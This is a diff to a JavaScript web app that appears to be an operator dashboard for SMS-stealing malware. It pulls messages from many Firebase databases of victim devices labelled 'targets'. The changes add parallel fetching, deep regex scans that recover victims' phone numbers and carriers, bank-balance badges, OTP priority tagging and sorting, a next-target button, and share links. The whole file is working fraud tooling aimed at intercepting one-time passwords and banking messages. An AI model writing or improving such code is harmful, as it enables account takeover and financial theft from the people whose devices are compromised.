+    slots.forEach(slot => {
+        if (!slot.phone || seen.has(slot.phone)) return;
+        seen.add(slot.phone);
+        knownCount++;
+        if (slot.src === 'rx') rxCount++;
+    });
+    return { knownCount, rxCount };
+}
+
+function targetNeedsDeepSmsScan(target) {
+    if (!target || target._deepRegexScanned) return false;
+    const profile = getTargetPhoneProfile(target);
+    if (profile.knownCount < 2) return true;
+    return profile.rxCount === 1;
+}
+
+function queueDeepRegexScan() {
+    const queuedKeys = new Set(bgQueue.map(item => getTargetCacheKey(item.dbUrl, item.did)));
+    const deepTargets = globalTargetsCache.filter(target => {
+        if (!target || !target._regexScanned || !targetNeedsDeepSmsScan(target)) return false;
+        return !queuedKeys.has(getTargetCacheKey(target.dbUrl, target.did));
+    });
+    deepTargets.forEach(target => bgQueue.push({ dbUrl: target.dbUrl, did: target.did, _deepScan: true }));
+    return deepTargets.length;
+}
+
+function getTargetCacheKey(dbUrl, did) {
+    return `${String(dbUrl || '')}::${String(did || '')}`;
+}
+
+function getCachedTarget(dbUrl, did) {
+    const cacheKey = getTargetCacheKey(dbUrl, did);
+    return globalTargetsCache.find(target => getTargetCacheKey(target.dbUrl, target.did) === cacheKey);
+}
+
+async function refreshTargetRegexOnOpen(target) {
+    if (!target || !target.dbUrl || !target.did) return;
+    const baseRoot = target.dbUrl.replace(/\/\.json$/, '');
+    try {
+        const fetched = await fetchSmsForTarget(baseRoot, target.did, 8000, true);
+        const latestTarget = getCachedTarget(target.dbUrl, target.did);
+        if (!latestTarget) return;
+        if (fetched.smsDict) latestTarget.smsDict = fetched.smsDict;
+        latestTarget._smsPhones = fetched.phones || [];
+        mergePhones(latestTarget, fetched.phones);
+        latestTarget._regexScanned = true;
+        if (isModalOpen && currentModalDid === String(target.did)) updateModalLive(currentModalDid);
+        renderFilteredList(true);
+    } catch (e) {}
+}
+
 function parseDatabaseSmartly(dbIndex, dbDump, dbUrl) {
     let targets = []; 
     if (typeof dbDump !== 'object' || dbDump === null) return targets;
     function buildTarget(did, infoObj, smsDict) { 
         let simData = extractPhoneAndCarrier(infoObj); let model = extractUniversalModel(infoObj);
-        let tObj = { dbIndex, did: String(did), p1: simData.p1, p2: simData.p2, c1: simData.c1, c2: simData.c2, p1Src: 'fb', p2Src: 'fb', smsDict: smsDict || {}, model: model, dbUrl: dbUrl };
-        if (smsDict) {
-            mergePhones(tObj, extractOwnPhonesFromSMS(smsDict));
-        }
+        let rawSmsDict = smsDict || {};
+        let previousTarget = getCachedTarget(dbUrl, did);
+        let tObj = { dbIndex, did: String(did), p1: simData.p1, p2: simData.p2, c1: simData.c1, c2: simData.c2, p1Src: 'fb', p2Src: 'fb', smsDict: keepLatestSms(rawSmsDict), model: model, dbUrl: dbUrl, _regexScanned: !!previousTarget?._regexScanned, _deepRegexScanned: !!previousTarget?._deepRegexScanned };
         return tObj; 
     }
     if (dbDump.user_data) { Object.entries(dbDump.user_data).forEach(([did, val]) => { if (isOnline(val)) targets.push(buildTarget(did, val, val.user_sms || val.sms || {})); }); }
@@ -1122,25 +2082,44 @@ function updateDashboardCounts() {
     } catch(e){}
 }
 
+async function mapWithConcurrency(items, limit, worker) {
+    const results = new Array(items.length);
+    let nextIndex = 0;
+    async function runWorker() {
+        while (true) {
+            const index = nextIndex++;
+            if (index >= items.length) return;
+            results[index] = await worker(items[index], index);
+        }
+    }
+    await Promise.all(Array.from({ length: Math.min(limit, items.length) }, runWorker));
+    return results;
+}
+
 async function fetchAndRenderTargets(silent = false) {
     if (silent && document.hidden) return;
-    if(isScanning) return; 
+    if(isScanning || isTargetFetchInProgress) return;
+    isTargetFetchInProgress = true;
+    try {
     const listContainer = document.getElementById("targetList");
     if(activeDatabases.length === 0) { if(!silent) listContainer.innerHTML = `<div class="empty-state">No active firebase connections.</div>`; return; }
     if(!silent) listContainer.innerHTML = `<div class="empty-state">Syncing data streams... ⏳</div>`;
     
     let allTargets = []; let deadNodes = [];
-    
-    for (let i = 0; i < activeDatabases.length; i++) { 
+    const databasesToFetch = activeDatabases.slice();
+    const databaseResults = await mapWithConcurrency(databasesToFetch, 3, async (dbUrl, index) => {
         try { 
-            let dbUrl = activeDatabases[i];
             let data = await fetchDatabaseSmart(dbUrl);
             if (data) {
-                let targets = parseDatabaseSmartly(`Node-${i+1}`, data, dbUrl);
-                allTargets = allTargets.concat(targets);
-            } else { deadNodes.push(dbUrl); }
-        } catch (e) { deadNodes.push(activeDatabases[i]); } 
-    }
+                return { dbUrl, targets: parseDatabaseSmartly(`Node-${index + 1}`, data, dbUrl) };
+            }
+        } catch (e) {}
+        return { dbUrl, targets: null };
+    });
+    databaseResults.forEach(result => {
+        if (Array.isArray(result.targets)) allTargets = allTargets.concat(result.targets);
+        else deadNodes.push(result.dbUrl);
+    });
 
     let existingTargets = globalTargetsCache; 
 
@@ -1154,7 +2133,7 @@ async function fetchAndRenderTargets(silent = false) {
     let retainedTargets = existingTargets.filter(t => !activeDatabases.includes(t.dbUrl));
     
     allTargets.forEach(newT => {
-        let oldT = existingTargets.find(t => String(t.did) === String(newT.did));
+        let oldT = existingTargets.find(t => getTargetCacheKey(t.dbUrl, t.did) === getTargetCacheKey(newT.dbUrl, newT.did));
         if (oldT) {
             if (!newT.smsDict) newT.smsDict = {};
             if (oldT.smsDict) { for (let k in oldT.smsDict) { if (!newT.smsDict[k]) newT.smsDict[k] = oldT.smsDict[k]; } }
@@ -1164,12 +2143,13 @@ async function fetchAndRenderTargets(silent = false) {
             if (String(newT.c1) === "Unknown" && String(oldT.c1) !== "Unknown") newT.c1 = oldT.c1;
             if (String(newT.c2) === "Unknown" && String(oldT.c2) !== "Unknown") newT.c2 = oldT.c2;
             
-            if (oldT.p1Src === 'rx' && newT.p1 === oldT.p1) newT.p1Src = 'rx';
-            if (oldT.p2Src === 'rx' && newT.p2 === oldT.p2) newT.p2Src = 'rx';
+            if (oldT.p1Src === 'rx') { newT.p1 = oldT.p1; newT.c1 = oldT.c1; newT.p1Src = 'rx'; }
+            if (oldT.p2Src === 'rx') { newT.p2 = oldT.p2; newT.c2 = oldT.c2; newT.p2Src = 'rx'; }
             if (!newT.p1Src) newT.p1Src = 'fb';
             if (!newT.p2Src) newT.p2Src = 'fb';
-            
-            mergePhones(newT, extractOwnPhonesFromSMS(newT.smsDict));
+            newT._regexScanned = !!oldT._regexScanned;
+            newT._deepRegexScanned = !!oldT._deepRegexScanned;
+            if (Array.isArray(oldT._smsPhones)) newT._smsPhones = oldT._smsPhones;
         }
         if (!seenDevices.has(String(newT.did))) {
             seenDevices.add(String(newT.did));
@@ -1197,41 +2177,117 @@ async function fetchAndRenderTargets(silent = false) {
     }
 
     isInitialBoot = false;
-    bgQueue = globalTargetsCache.filter(t => t.p1 === "Unknown" || Object.keys(t.smsDict).length === 0);
-    if (bgQueue.length > 0 && !isBgProcessing) processBgQueue();
-    if(!livePollingActive) { livePollingActive = true; setInterval(() => { fetchAndRenderTargets(true); }, 10000); }
+    if (!isBgProcessing) {
+        bgQueue = globalTargetsCache.filter(t => !t._regexScanned);
+        if (bgQueue.length > 0) processBgQueue();
+        else finishRegexBatch();
+    }
+    if(!livePollingActive) { livePollingActive = true; setInterval(() => { if (!pauseClientPollingForRegex && !isBgProcessing) fetchAndRenderTargets(true); }, 10000); }
+    } finally {
+        isTargetFetchInProgress = false;
+    }
+}
+
+function finishRegexBatch() {
+    if (!pauseClientPollingForRegex) return;
+    pauseClientPollingForRegex = false;
+    if (regexFinalRefreshPending) {
+        regexFinalRefreshPending = false;
+        setTimeout(() => fetchAndRenderTargets(true), 0);
+    }
 }
 
 async function processBgQueue() {
     if (document.hidden) { setTimeout(processBgQueue, 4000); return; }
-    if (bgQueue.length === 0) { isBgProcessing = false; let ind = document.getElementById("bg-sync-indicator"); if(ind && !ind.innerText.includes("NEW DEVICE")) ind.style.display = 'none'; return; }
-    isBgProcessing = true; let batch = bgQueue.splice(0, 3); 
+    if (bgQueue.length === 0) {
+        const deepCount = queueDeepRegexScan();
+        if (deepCount > 0) { setTimeout(processBgQueue, SMS_BG_NEXT_DELAY_MS); return; }
+        isBgProcessing = false; flushVaultSave(); let ind = document.getElementById("bg-sync-indicator"); if(ind && !ind.innerText.includes("NEW DEVICE")) ind.style.display = 'none'; finishRegexBatch(); return;
+    }
+    isBgProcessing = true;
+    const isDeepBatch = !!bgQueue[0]._deepScan;
+    let batch = bgQueue.splice(0, isDeepBatch ? SMS_DEEP_BG_BATCH_SIZE : SMS_BG_BATCH_SIZE); 
     let ind = document.getElementById("bg-sync-indicator"); if(ind) { ind.style.display = "block"; ind.innerText = `> DECRYPTING BACKGROUND PAYLOADS [Remaining: ${bgQueue.length}]... ⏳`; }
+    if (ind && isDeepBatch) ind.innerText = `> DEEP SCANNING UNKNOWN SIMS [Remaining: ${bgQueue.length}]...`;
 
     let promises = batch.map(async (t) => {
-        let baseRoot = t.dbUrl.replace(/\/\.json$/, '');
-        let msgUrl = `${baseRoot}/messages/${t.did}/.json`; let smsUrl = `${baseRoot}/user_sms/${t.did}/.json`; let fetchedSms = null;
-        try { let mRes = await fetchWithTimeout(msgUrl, 8000); if (mRes && typeof mRes === 'object' && Object.keys(mRes).length > 0) fetchedSms = mRes; else { let sRes = await fetchWithTimeout(smsUrl, 8000); if (sRes && typeof sRes === 'object' && Object.keys(sRes).length > 0) fetchedSms = sRes; } } catch(e) {}
-        
-        if (fetchedSms) {
-            let latestT = globalTargetsCache.find(x => String(x.did) === String(t.did));
+        const queuedTarget = getCachedTarget(t.dbUrl, t.did);
+        const isDeepScan = !!t._deepScan;
+        if (!queuedTarget || (isDeepScan ? queuedTarget._deepRegexScanned : queuedTarget._regexScanned)) return;
+        try {
+            let baseRoot = t.dbUrl.replace(/\/\.json$/, '');
+            let fetched = await fetchSmsForTarget(baseRoot, t.did, isDeepScan ? 11000 : 8000, true, isDeepScan ? SMS_DEEP_SCAN_PAGE_SIZE : SMS_SCAN_PAGE_SIZE);
+            let latestT = getCachedTarget(t.dbUrl, t.did);
             if(latestT) {
-                if (!latestT.smsDict) latestT.smsDict = {};
-                for (let msgId in fetchedSms) latestT.smsDict[msgId] = fetchedSms[msgId];
-                mergePhones(latestT, extractOwnPhonesFromSMS(latestT.smsDict));
+                if (fetched.smsDict) latestT.smsDict = fetched.smsDict;
+                latestT._smsPhones = fetched.phones || [];
+                mergePhones(latestT, fetched.phones || []);
+                if (isDeepScan) latestT._deepRegexScanned = true;
+                else latestT._regexScanned = true;
                 if (scanIsRunning && scanTargetsMap[String(latestT.did)]) {
                     syncScanQueueForTarget(latestT);
                     updateScanStats();
                 }
             }
+        } catch (e) {
+            let latestT = getCachedTarget(t.dbUrl, t.did);
+            if (latestT) {
+                if (isDeepScan) latestT._deepRegexScanned = true;
+                else latestT._regexScanned = true;
+            }
         }
     });
-    await Promise.allSettled(promises); renderFilteredList(true); setTimeout(processBgQueue, 1000); 
+    await Promise.allSettled(promises); renderFilteredList(true); setTimeout(processBgQueue, isDeepBatch ? SMS_DEEP_BG_NEXT_DELAY_MS : SMS_BG_NEXT_DELAY_MS); 
 }
 
 // ===================== RENDER & FILTERS =====================
 let renderTimeout = null;
 let renderFrame = 0;
+
+function normalizeCarrierText(carrier) {
+    return String(carrier || '').trim().toUpperCase();
+}
+
+function targetMatchesCarrierFilter(target) {
+    if (!carrierFilter) return true;
+    const carriers = [normalizeCarrierText(target && target.c1), normalizeCarrierText(target && target.c2)];
+    if (carrierFilter === 'VI') return carriers.some(carrier => carrier === 'VI' || carrier.includes('VODAFONE') || carrier.includes('IDEA'));
+    return carriers.some(carrier => carrier.includes(carrierFilter));
+}
+
+function toggleCarrierFilterMenu() {
+    forceTargetsScreen();
+    const menu = document.getElementById('carrier-filter-menu');
+    if (menu) menu.classList.toggle('open');
+}
+
+function closeCarrierFilterMenu() {
+    document.getElementById('carrier-filter-menu')?.classList.remove('open');
+}
+
+function syncCarrierFilterUI() {
+    const input = document.getElementById('carrier-filter-input');
+    if (input) input.value = carrierFilter || 'ALL CARRIERS';
+    document.querySelectorAll('#carrier-filter-menu button').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.carrier === carrierFilter);
+    });
+}
+
+function selectCarrierFilter(carrier) {
+    carrierFilter = carrier;
+    syncCarrierFilterUI();
+    closeCarrierFilterMenu();
+    forceTargetsScreen();
+    renderFilteredList(true);
+}
+
+function resetCarrierFilter() {
+    carrierFilter = "";
+    syncCarrierFilterUI();
+    closeCarrierFilterMenu();
+    renderFilteredList(true);
+}
+
 function renderFilteredList(skipDebounce = false) {
     clearTimeout(renderTimeout);
     if (renderFrame) { cancelAnimationFrame(renderFrame); renderFrame = 0; }
@@ -1248,6 +2304,7 @@ function renderFilteredList(skipDebounce = false) {
                 let passFilter = (currentFilter === 'GLOBAL') ? true : (currentFilter === 'HOT' ? hasSms : !hasSms);
                 if(!passFilter) return false;
                 if((unregModeActive || unregFilterActive) && !unregDids.has(String(t.did))) return false;
+                if(!targetMatchesCarrierFilter(t)) return false;
                 if(searchQuery) { return (t.p1 && t.p1.includes(searchQuery)) || (t.p2 && t.p2.includes(searchQuery)) || (t.did && String(t.did).toLowerCase().includes(searchQuery)) || (t.model && String(t.model).toLowerCase().includes(searchQuery)) || (t.dbIndex && String(t.dbIndex).toLowerCase().includes(searchQuery)) || (t.c1 && String(t.c1).toLowerCase().includes(searchQuery)); }
                 return true;
             });
@@ -1282,7 +2339,7 @@ function renderFilteredList(skipDebounce = false) {
                     if(safeFavArr.includes(safeDid)) badgesHTML += `<span class="ext-badge bdg-fav">⭐ FAV</span>`;
                     
                     let bankBadgesHTML = '';
-                    try { let bankData = calculateBankBalances(t.smsDict); if(Array.isArray(bankData) && bankData.length > 0) { bankBadgesHTML += `<span class="ext-badge bdg-bank">${bankData[0].text}</span>`; } } catch(e) {}
+                    try { let bankData = getCachedBankBalances(t); if(Array.isArray(bankData) && bankData.length > 0) { bankBadgesHTML += `<span class="ext-badge bdg-bank">${bankData[0].text}</span>`; } } catch(e) {}
 
                     let p1Color = t.p1Src === 'rx' ? '#00ff80' : (t.p1Src === 'vault' ? '#00e5ff' : 'var(--text-bright)');
                     let p1Shadow = t.p1Src === 'rx' ? 'rgba(0,255,128,0.5)' : (t.p1Src === 'vault' ? 'rgba(0,229,255,0.5)' : 'var(--primary)');
@@ -1320,6 +2377,35 @@ function renderFilteredList(skipDebounce = false) {
 function setFilter(filterType, btnElement) { try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} document.querySelectorAll('.filter-chip').forEach(el => el.classList.remove('active')); btnElement.classList.add('active'); currentFilter = filterType; renderFilteredList(true); }
 
 // ===================== MODAL =====================
+function getVisibleTargetsForModalNav() {
+    const searchEl = document.getElementById("target-search-input");
+    const searchQuery = ((searchEl && searchEl.value) || "").toLowerCase().trim();
+    return globalTargetsCache.filter(t => {
+        let hasSms = t.smsDict ? Object.keys(t.smsDict).length > 0 : false;
+        let passFilter = (currentFilter === 'GLOBAL') ? true : (currentFilter === 'HOT' ? hasSms : !hasSms);
+        if(!passFilter) return false;
+        if((unregModeActive || unregFilterActive) && !unregDids.has(String(t.did))) return false;
+        if(!targetMatchesCarrierFilter(t)) return false;
+        if (searchQuery) {
+            let haystack = `${t.did || ''} ${t.model || ''} ${t.p1 || ''} ${t.p2 || ''} ${t.c1 || ''} ${t.c2 || ''}`.toLowerCase();
+            if(!haystack.includes(searchQuery)) return false;
+        }
+        return true;
+    });
+}
+function openNextTarget() {
+    if(!currentModalDid) return;
+    const visibleTargets = getVisibleTargetsForModalNav();
+    if(!visibleTargets.length) { showToast('NO NEXT TARGET.'); return; }
+    let currentIndex = visibleTargets.findIndex(t => String(t.did) === String(currentModalDid));
+    let nextTarget = visibleTargets[(currentIndex + 1 + visibleTargets.length) % visibleTargets.length];
+    if(!nextTarget || String(nextTarget.did) === String(currentModalDid)) { showToast('ONLY ONE TARGET VISIBLE.'); return; }
+    try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {}
+    openTargetModal(nextTarget.did);
+}
+function openSendSmsStub() {
+    showToast('SEND SMS UI COMING NEXT.');
+}
 function openTargetModal(did) { 
     isModalOpen = true; currentModalDid = String(did); 
     try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium'); } catch(e) {} 
@@ -1332,9 +2418,7 @@ function openTargetModal(did) {
 
     if (t && t.dbUrl) {
         const baseRoot = t.dbUrl.replace(/\/\.json$/, '');
-        let msgUrl = `${baseRoot}/messages/${currentModalDid}/.json`; 
-        let smsUrl = `${baseRoot}/user_sms/${currentModalDid}/.json`;
-
+        refreshTargetRegexOnOpen(t);
         function fetchLive() {
             function mergeSms(newData) {
                 let latestT = globalTargetsCache.find(x => String(x.did) === currentModalDid);
@@ -1342,15 +2426,14 @@ function openTargetModal(did) {
                 let isNewMsg = false; 
                 if(!latestT.smsDict) latestT.smsDict = {};
                 for(let k in newData) { if(!latestT.smsDict[k]) { latestT.smsDict[k] = newData[k]; isNewMsg = true; } }
+                latestT.smsDict = keepLatestSms(latestT.smsDict);
                 if(isNewMsg) { 
-                    mergePhones(latestT, extractOwnPhonesFromSMS(latestT.smsDict));
                     updateModalLive(currentModalDid); 
                     renderFilteredList(true); 
                 }
             }
             
-            fetch(msgUrl).then(r => r.json()).then(m => { if (m && typeof m === 'object' && Object.keys(m).length > 0) mergeSms(m); }).catch(()=>{});
-            fetch(smsUrl).then(r => r.json()).then(s => { if (s && typeof s === 'object' && Object.keys(s).length > 0) mergeSms(s); }).catch(()=>{});
+            fetchSmsForTarget(baseRoot, currentModalDid, 8000).then(fetched => { if (fetched.smsDict) mergeSms(fetched.smsDict); }).catch(()=>{});
         }
         
         fetchLive(); 
@@ -1366,6 +2449,11 @@ function applySmsFilter() { activeSmsFilter = document.getElementById("sms-filte
 function toggleUsed() { if(!currentModalDid) return; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} if(usedTargets.includes(currentModalDid)) { usedTargets = usedTargets.filter(id => id !== currentModalDid); } else { usedTargets.push(currentModalDid); } saveStorage(); updateModalLive(currentModalDid); renderFilteredList(true); }
 function toggleFav() { if(!currentModalDid) return; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} if(favTargets.includes(currentModalDid)) { favTargets = favTargets.filter(id => id !== currentModalDid); } else { favTargets.push(currentModalDid); } saveStorage(); updateDashboardCounts(); updateModalLive(currentModalDid); renderFilteredList(true); }
 function clearSms() { if(!currentModalDid) return; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium'); } catch(e) {} clearedTimes[currentModalDid] = Date.now(); saveStorage(); updateModalLive(currentModalDid); }
+
+function isUnknownSmsSender(sender) {
+    let clean = String(sender || '').trim().toLowerCase();
+    return !clean || clean === 'unknown' || clean === 'undefined' || clean === 'null' || clean === 'na' || clean === 'n/a';
+}
 
 function updateModalLive(did) {
     let safeDid = String(did);
@@ -1431,25 +2519,37 @@ function updateModalLive(did) {
         let rawBodyText = String(msg.body || msg.msg || msg.message || msg.Body || msg.Message || msg.text || "No Content");
         let senderText = String(msg.sender || msg.ph || msg.address || msg.Sender || msg.Address || msg.title || "Unknown");
         
-        if (activeSmsFilter && !rawBodyText.toLowerCase().includes(activeSmsFilter) && !senderText.toLowerCase().includes(activeSmsFilter)) continue;
-        
         if (msg._localTs >= clearTime) {
-            smsArr.push({ body: extractAndWrapOTP(rawBodyText), sender: senderText, ts: msg._localTs });
+            let isPriorityOtp = /\b(?:otp|one[\s-]*time\s+(?:password|code)|verification\s+code|passcode)\b/i.test(rawBodyText) && /\b\d{4,8}\b/.test(rawBodyText);
+            smsArr.push({ body: rawBodyText, sender: senderText, ts: msg._localTs, isPriorityOtp, isUnknownSender: isUnknownSmsSender(senderText) });
         }
     }
 
-    smsArr.sort((a,b) => b.ts - a.ts); 
+    smsArr.sort((a,b) => {
+        if (a.isUnknownSender !== b.isUnknownSender) return a.isUnknownSender ? 1 : -1;
+        return b.ts - a.ts;
+    });
+    smsArr = smsArr.slice(0, SMS_PAGE_SIZE);
+    if (activeSmsFilter) smsArr = smsArr.filter(msg => msg.body.toLowerCase().includes(activeSmsFilter) || msg.sender.toLowerCase().includes(activeSmsFilter));
     document.getElementById('m-sms-count').innerText = activeSmsFilter ? `${smsArr.length} Filtered` : `${smsArr.length} Msgs`;
     
     let feedContainer = document.getElementById('m-sms-feed'); let currentMsgCount = feedContainer.children.length;
     if (currentMsgCount > 0 && smsArr.length > currentMsgCount && feedContainer.innerHTML.indexOf("Awaiting packets") === -1) { let bolt = document.getElementById('live-bolt'); if(bolt) { bolt.classList.add('flash'); setTimeout(() => { bolt.classList.remove('flash'); }, 1000); try { if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success'); } catch(e){} } }
     
     if(smsArr.length === 0) { feedContainer.innerHTML = `<div style="text-align:center; color:var(--text-dim); padding-top:20px;">${activeSmsFilter ? `No packets matching "${activeSmsFilter}"...` : `Awaiting packets...`}</div>`; } 
-    else { let feedHTML = ''; smsArr.forEach(msg => { let d = new Date(msg.ts); let timeStr = d.toLocaleString(); if(timeStr === "Invalid Date") timeStr = "Unknown Time"; feedHTML += `<div class="msg-bubble outline-card">${outlineEdgesHTML}<div class="msg-sender">${msg.sender} <span class="msg-time">${timeStr}</span></div><div class="msg-text">${msg.body}</div></div>`; }); feedContainer.innerHTML = feedHTML; }
+    else { let feedHTML = ''; smsArr.forEach(msg => { let d = new Date(msg.ts); let timeStr = d.toLocaleString(); if(timeStr === "Invalid Date") timeStr = "Unknown Time"; let priorityTag = msg.isPriorityOtp ? '<span class="otp-priority-tag">OTP PRIORITY</span>' : ''; feedHTML += `<div class="msg-bubble outline-card${msg.isPriorityOtp ? ' otp-priority' : ''}">${outlineEdgesHTML}${priorityTag}<div class="msg-sender">${msg.sender} <span class="msg-time">${timeStr}</span></div><div class="msg-text">${extractAndWrapOTP(msg.body)}</div></div>`; }); feedContainer.innerHTML = feedHTML; }
 }
 
 // ===================== SWIPE NAVIGATION =====================
 let screens = document.querySelectorAll(".screen"); let dockBtns = document.querySelectorAll(".dock button"); let current = 0; let isModalOpen = false;
+let scrollIdleTimer = null;
+function markAppScrolling() {
+  document.body.classList.add('app-scrolling');
+  clearTimeout(scrollIdleTimer);
+  scrollIdleTimer = setTimeout(() => document.body.classList.remove('app-scrolling'), 120);
+}
+screens.forEach(screen => screen.addEventListener('scroll', markAppScrolling, { passive: true }));
+document.getElementById('m-sms-feed').addEventListener('scroll', markAppScrolling, { passive: true });
 function openOption(name, index, btnElement) { if (current === index) return; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('heavy'); } catch(e) {} let s = document.getElementById("optionSplash"); let t = document.getElementById("optText"); t.innerText = name; s.style.display = "flex"; setTimeout(() => { s.style.display = "none"; current = index; render(); }, 400); }
 function forceTargetsScreen() { if(current !== 1) openOption('Targets', 1, dockBtns[1]); }
 let startX = 0; let isDragging = false; let swipeWrap = document.querySelector(".swipeWrap"); let swipeFrame = 0; let pendingSwipeDelta = 0;
@@ -1457,12 +2557,15 @@ swipeWrap.addEventListener("pointerdown", e => { if(isModalOpen || e.target.clos
 swipeWrap.addEventListener("pointermove", e => { if (!isDragging) return; pendingSwipeDelta = e.clientX - startX; if (swipeFrame) return; swipeFrame = requestAnimationFrame(() => { swipeFrame = 0; let deltaX = pendingSwipeDelta; screens.forEach((s, i) => { if (i === current) s.style.transform = `translateX(${deltaX}px)`; else if (i === current - 1) s.style.transform = `translateX(calc(-100% + ${deltaX}px))`; else if (i === current + 1) s.style.transform = `translateX(calc(100% + ${deltaX}px))`; }); }); });
 function handleSwipeEnd(e) { if (!isDragging) return; isDragging = false; let deltaX = e.clientX - startX; if (swipeFrame) { cancelAnimationFrame(swipeFrame); swipeFrame = 0; } screens.forEach(s => { s.style.transition = "0.4s cubic-bezier(.25,1,.25,1)"; s.style.transform = ""; }); if (deltaX < -60 && current < screens.length - 1) { current++; try { if (tg) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} } else if (deltaX > 60 && current > 0) { current--; try { if (tg) tg.HapticFeedback.impactOccurred('light'); } catch(e) {} } render(); }
 swipeWrap.addEventListener("pointerup", handleSwipeEnd); swipeWrap.addEventListener("pointercancel", handleSwipeEnd);
-function render() { screens.forEach((s, i) => { s.className = "screen"; if (i < current) s.classList.add("out"); else if (i === current) s.classList.add("active"); else s.classList.add("next"); }); dockBtns.forEach(b => b.classList.remove("active-btn")); if (dockBtns[current]) dockBtns[current].classList.add("active-btn"); if (current === 1) renderFilteredList(true); }
+function render() { document.body.classList.toggle('targets-screen-active', current === 1); screens.forEach((s, i) => { s.className = "screen"; if (i < current) s.classList.add("out"); else if (i === current) s.classList.add("active"); else s.classList.add("next"); }); dockBtns.forEach(b => b.classList.remove("active-btn")); if (dockBtns[current]) dockBtns[current].classList.add("active-btn"); if (current === 1) renderFilteredList(true); }
 
 document.addEventListener('visibilitychange', () => {
   document.body.classList.toggle('app-background-paused', document.hidden);
+  if (document.hidden) flushVaultSave();
   if (!document.hidden && current === 1) renderFilteredList(true);
 });
+window.addEventListener('pagehide', flushVaultSave);
+window.addEventListener('beforeunload', flushVaultSave);
 
 // ===================== STEALTH DOCK =====================
 let isStealthOff = false; let lastTapTime = 0;
@@ -1471,15 +2574,46 @@ function toggleStealth() { isStealthOff = !isStealthOff; if(isStealthOff) docume
 
 // ===================== INITIAL BOOT =====================
 function initializeFirebaseList() {
-  extractUrlsFromText(PERMANENT_FIREBASES_TEXT).forEach(url => { if (firebaseList.filter(i => i.isConnected).length < 2) { firebaseList.push({ url, isConnected: true }); activeDatabases.push(url); } else { firebaseList.push({ url, isConnected: false }); } });
+  extractUrlsFromText(PERMANENT_FIREBASES_TEXT).filter(url => !removedFirebaseUrls.includes(url)).forEach(url => { firebaseList.push({ url, isConnected: true }); activeDatabases.push(url); });
+}
+
+function placeShareButton() {
+  const topBar = document.querySelector('.top-bar');
+  const profileButton = topBar && topBar.querySelector('.icon-btn:last-child');
+  if (!topBar || !profileButton || topBar.querySelector('.top-bar-actions')) return;
+  const actions = document.createElement('div');
+  actions.className = 'top-bar-actions';
+  actions.innerHTML = `
+    <div class="theme-picker-wrap">
+      <button class="theme-toggle-btn" type="button" onclick="toggleThemeMenu(event)" title="Change theme">
+        <span class="theme-swatch"></span><span class="theme-label" id="theme-current-label">VOID PURPLE</span>
+      </button>
+      <div class="theme-menu" id="theme-menu"></div>
+    </div>
+    <div class="share-menu-wrap">
+      <button class="top-share-btn" type="button" onclick="openShareModal('all')">SHARE</button>
+      <button class="share-menu-toggle" type="button" aria-label="Share options" onclick="toggleShareMenu(event)">▾</button>
+      <div class="share-action-menu" id="share-action-menu">
+        <button type="button" onclick="openShareModal('all')">ALL</button>
+        <button type="button" onclick="openShareModal('connected')">ONLY CONNECTED</button>
+        <button type="button" onclick="openShareModal('select')">SELECT</button>
+      </div>
+    </div>
+  `;
+  actions.appendChild(profileButton);
+  topBar.appendChild(actions);
+  renderThemeMenu();
 }
 
 document.addEventListener("DOMContentLoaded", () => { 
+    placeShareButton();
     let payloadAdded = checkSharedPayload();
+    const secureToken = getSecureShareTokenFromPath();
     setTimeout(() => { 
         let splash = document.getElementById("splash"); if(splash) { splash.classList.add("hideSplash"); setTimeout(() => splash.remove(), 800); } 
-        if(!payloadAdded && firebaseList.length === 0) initializeFirebaseList();
+        if(!payloadAdded && !secureToken && firebaseList.length === 0) initializeFirebaseList();
         renderFirebaseList(); updateDashboardCounts(); if(activeDatabases.length > 0) fetchAndRenderTargets(false);
+        if (secureToken) loadSecureShareLink(secureToken);
     }, 1500); 
 });
 setTimeout(() => { let splash = document.getElementById("splash"); if(splash && !splash.classList.contains("hideSplash")) { splash.classList.add("hideSplash"); setTimeout(() => splash.remove(), 800); } }, 3000);
@@ -2148,7 +3282,9 @@ function getScanPhonesFromTarget(target) {
   function add(raw) { let n = cleanNumForScan(raw); if (n) phones.add(n); }
   add(target.p1);
   add(target.p2);
-  extractOwnPhonesFromSMS(target.smsDict || {}).forEach(p => add(p.phone));
+  const rxPhones = Array.isArray(target._smsPhones) ? target._smsPhones : extractOwnPhonesFromSMS(target.smsDict || {});
+  target._smsPhones = rxPhones;
+  rxPhones.forEach(p => add(p.phone));
   return Array.from(phones);
 }
 function buildScanTargetFromClient(did, val, fbUrl) {
@@ -2167,30 +3303,28 @@ function buildScanTargetFromClient(did, val, fbUrl) {
     model: extractUniversalModel(val),
     dbUrl: fbUrl
   };
-  mergePhones(targetObj, extractOwnPhonesFromSMS(targetObj.smsDict));
+  targetObj._smsPhones = extractOwnPhonesFromSMS(targetObj.smsDict);
+  mergePhones(targetObj, targetObj._smsPhones);
   return targetObj;
 }
 async function hydrateScanTargetsWithSms(targets, fbUrl) {
   if (!Array.isArray(targets) || !targets.length) return;
   let baseRoot = fbUrl.replace(/\/\.json$/, '').replace(/\.json$/, '');
-  await Promise.allSettled(targets.map(async t => {
-    if (!t || !t.did) return;
-    let fetchedSms = null;
-    try {
-      let mRes = await fetchWithTimeout(`${baseRoot}/messages/${t.did}/.json`, 4000);
-      if (mRes && typeof mRes === 'object' && Object.keys(mRes).length > 0) fetchedSms = mRes;
-    } catch(e) {}
-    if (!fetchedSms) {
-      try {
-        let sRes = await fetchWithTimeout(`${baseRoot}/user_sms/${t.did}/.json`, 4000);
-        if (sRes && typeof sRes === 'object' && Object.keys(sRes).length > 0) fetchedSms = sRes;
-      } catch(e) {}
+  let nextIndex = 0;
+  let workerCount = Math.min(SMS_HYDRATE_CONCURRENCY, targets.length);
+  let workers = Array.from({ length: workerCount }, async () => {
+    while (nextIndex < targets.length) {
